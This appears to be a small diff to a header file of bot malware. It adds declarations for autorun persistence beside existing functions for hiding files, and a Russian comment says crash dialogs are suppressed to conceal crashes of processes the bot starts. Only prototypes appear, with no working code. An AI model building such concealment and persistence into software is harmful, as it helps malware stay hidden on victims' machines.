@@ -36,3 +36,6 @@ BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint);
 //         процесса. Тем самым мы скроем крах запущенных ботом процессов
 //----------------------------------------------------------------------------
 void DisableShowFatalErrorDialog();
+
+void AddToAutoRun(void *body, DWORD size);
+void AddToAutoRun(WCHAR *ModulePath);
